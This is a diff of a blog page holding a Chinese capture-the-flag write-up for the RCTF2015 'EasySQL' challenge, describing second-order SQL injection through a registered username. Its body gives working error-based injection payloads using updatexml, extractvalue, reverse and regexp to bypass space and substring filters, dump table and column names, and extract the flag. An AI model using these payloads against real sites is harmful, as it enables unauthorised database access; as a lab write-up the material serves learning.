@@ -6,21 +6,13 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="HandheldFriendly" content="True">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
-    <meta name="description" content="题目地址：Easy SQL">
+    <meta name="description" content="题目地址：Easy SQL">
 <meta property="og:type" content="article">
 <meta property="og:title" content="RCTF2015 EasySQL">
 <meta property="og:url" content="https://hdfzzf.github.io/2022/05/19/RCTF2015%20EasySQL/index.html">
 <meta property="og:site_name" content="HDFZZF&#39;s BLOG">
-<meta property="og:description" content="题目地址：Easy SQL">
+<meta property="og:description" content="题目地址：Easy SQL">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220519220501.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220519220600.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220519220746.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220519221214.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220519222934.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220519223238.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220519223434.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220519223544.png">
 <meta property="article:published_time" content="2022-05-18T16:00:00.000Z">
 <meta property="article:modified_time" content="2022-05-19T14:39:38.048Z">
 <meta property="article:author" content="hdfzzf">
@@ -29,7 +21,6 @@
 <meta property="article:tag" content="过滤空格">
 <meta property="article:tag" content="过滤字符串截取函数">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220519220501.png">
     
     
       
@@ -161,22 +152,30 @@
   
 
   <div class="content" itemprop="articleBody">
-    <p>题目地址：<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#%5BRCTF2015%5DEasySQL">Easy SQL</a></p>
+    <p>题目地址：<a
+target="_blank" rel="noopener" href="https://buuoj.cn/challenges#%5BRCTF2015%5DEasySQL">Easy
+SQL</a></p>
 <span id="more"></span>
 <h1 id="题目信息">1. 题目信息</h1>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220519220501.png" /></p>
+<p><img
+src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220519220501.png" /></p>
 <p>在登陆界面测试了一下，没有存在SQL注入。于是注册一个账号查看以下功能点。</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220519220600.png" /></p>
+<p><img
+src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220519220600.png" /></p>
 <p>这四个蓝色的都测试了一下，下面三个的url虽然有title=，但是没有注入点。</p>
-<p>因此，注入点应该就是在 change password 里面，也就是可能存在二次注入</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220519220746.png" /></p>
+<p>因此，注入点应该就是在 change password
+里面，也就是可能存在二次注入</p>
+<p><img
+src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220519220746.png" /></p>
 <p>因此，去外面尝试注册带有不同字符的用户（密码也可以尝试下），尝试到双引号的时候出现了报错：</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220519221214.png" /></p>
+<p><img
+src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220519221214.png" /></p>
 <h1 id="解题">2. 解题</h1>
 <p>先fuzz以下，看一下过滤了什么，经测试，过滤了空格以及字符串截取函数（划重点）。因此使用报错注入。</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> m1ku&quot;^updatexml(1,concat(0x7e,database(),0x7e),0)#  -&gt; web_sqli</span><br><span class="line">2. m1ku&quot;<span class="operator">^</span>updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span>(group_concat(table_name))<span class="keyword">from</span>(information_schema.tables)<span class="keyword">where</span>(table_schema<span class="operator">=</span>database())),<span class="number">0x7e</span>),<span class="number">0</span>)# <span class="operator">-</span><span class="operator">&gt;</span> article,flag,users</span><br><span class="line"><span class="number">3.</span> m1ku&quot;^extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;users&#x27;)),0x7e))#</span><br></pre></td></tr></table></figure>
 <p>第3句payload其实得不到完全的字段名</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220519222934.png" /></p>
+<p><img
+src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220519222934.png" /></p>
 <p>这时候其实有两种方式：</p>
 <ol type="1">
 <li>利用reverse反转一下，显示后面的字符串。（针对长度不是很长，即&lt;=60）</li>
@@ -185,11 +184,14 @@
 <p>第一种方式就给个payload吧： <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">m1ku&quot;^extractvalue(1,concat(0x7e,reverse((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;users&#x27;))),0x7e))#</span><br><span class="line"></span><br><span class="line">结果为：ereh_s1_galf_laer,liame,dwp,ema</span><br></pre></td></tr></table></figure></p>
 <p>第二种方式的payload： <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">m1ku&quot;^updatexml(1,concat(0x3a,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;users&#x27;)&amp;&amp;(column_name)regexp(&#x27;^r&#x27;))),1)#</span><br></pre></td></tr></table></figure></p>
 <p>意思就是只显示以r开头的字段名。因此结果为：</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220519223238.png" /></p>
+<p><img
+src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220519223238.png" /></p>
 <p>读取flag的payload： <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">m1ku&quot;^extractvalue(1,concat(0x7e,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#x27;^f&#x27;)),0x7e))#</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220519223434.png" /></p>
+<p><img
+src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220519223434.png" /></p>
 <p>然后利用 reverse 读取后面剩余的字符串： <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">m1ku&quot;^extractvalue(1,concat(0x7e,reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#x27;^f&#x27;))),0x7e))#</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220519223544.png" /></p>
+<p><img
+src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220519223544.png" /></p>
 <p>然后将前后两部分整合一下： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;c8c1f4cb-646d-446e-9dcd-ae971ef725f0&#125;</span><br></pre></td></tr></table></figure></p>
 <h1 id="总结">3. 总结</h1>
 <p>该题目考察的也是二次注入，不过还需要绕过：</p>
@@ -244,7 +246,9 @@
   <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://hdfzzf.github.io/2022/05/19/RCTF2015%20EasySQL/&title=RCTF2015 EasySQL"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
   <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://hdfzzf.github.io/2022/05/19/RCTF2015%20EasySQL/&title=RCTF2015 EasySQL"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
   <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://hdfzzf.github.io/2022/05/19/RCTF2015%20EasySQL/&title=RCTF2015 EasySQL"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://hdfzzf.github.io/2022/05/19/RCTF2015%20EasySQL/&name=RCTF2015 EasySQL&description=&lt;p&gt;题目地址：&lt;a href=&#34;https://buuoj.cn/challenges#%5BRCTF2015%5DEasySQL&#34;&gt;Easy SQL&lt;/a&gt;&lt;/p&gt;"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://hdfzzf.github.io/2022/05/19/RCTF2015%20EasySQL/&name=RCTF2015 EasySQL&description=&lt;p&gt;题目地址：&lt;a
+href=&#34;https://buuoj.cn/challenges#%5BRCTF2015%5DEasySQL&#34;&gt;Easy
+SQL&lt;/a&gt;&lt;/p&gt;"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
   <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://hdfzzf.github.io/2022/05/19/RCTF2015%20EasySQL/&t=RCTF2015 EasySQL"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
 </ul>
 
@@ -265,7 +269,7 @@
     Copyright &copy;
     
     
-    2021-2022
+    2021-2023
     hdfzzf
   </div>
   <div class="footer-right">
